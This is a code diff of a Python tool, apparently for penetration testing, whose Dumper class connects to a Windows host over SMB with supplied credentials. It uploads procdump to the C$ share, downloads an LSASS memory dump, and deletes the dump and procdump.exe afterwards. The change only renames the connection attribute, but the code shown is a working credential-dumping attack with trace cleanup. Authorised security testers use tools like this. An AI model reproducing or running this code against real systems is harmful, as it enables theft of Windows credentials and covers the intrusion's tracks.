@@ -39,21 +39,19 @@ class Dumper:
             "password": password,
             "domain": domain,
         }
-        self.smb_impacket = SMBConnection(
-            self.target, self.target, sess_port=445, timeout=4
-        )
+        self.smb = SMBConnection(self.target, self.target, sess_port=445, timeout=4)
         self.host_info = self.enum_host_info()
 
     def enum_host_info(self):
         info_dict = {}
-        self.smb_impacket.login(
+        self.smb.login(
             user=self.credentials["username"],
             password=self.credentials["password"],
             domain=self.credentials["domain"],
         )
-        os = self.smb_impacket.getServerOS()
+        os = self.smb.getServerOS()
         arch = self.get_arch()
-        domain = self.smb_impacket.getServerDomain()
+        domain = self.smb.getServerDomain()
         info_dict.update({"target": self.target})
         info_dict.update({"os": os})
         info_dict.update({"domain": domain})
@@ -88,7 +86,7 @@ class Dumper:
         elif self.host_info["arch"] == 32:
             src = src_x32
         filename = re.sub(r"\d+", "", path.basename(src))
-        self.smb_impacket.putFile("C$", filename, open(src, "rb").read)
+        self.smb.putFile("C$", filename, open(src, "rb").read)
 
     def exec_procdump(self):
 
@@ -113,16 +111,14 @@ class Dumper:
 
     def dump_lsass(self):
         print("Dumping")
-        self.smb_impacket.getFile(
-            "C$", "/lsass_dump.dmp", open("lsass_dump.dmp", "wb").write
-        )
+        self.smb.getFile("C$", "/lsass_dump.dmp", open("lsass_dump.dmp", "wb").write)
         print("Finished")
 
     def clear_out(self):
         print("Starting ClearOut")
-        self.smb_impacket.deleteFile("C$", "/lsass_dump.dmp")
-        self.smb_impacket.deleteFile("C$", "/procdump.exe")
-        self.smb_impacket.close()
+        self.smb.deleteFile("C$", "/lsass_dump.dmp")
+        self.smb.deleteFile("C$", "/procdump.exe")
+        self.smb.close()
         print("ClearOut Finished")
 
     @staticmethod
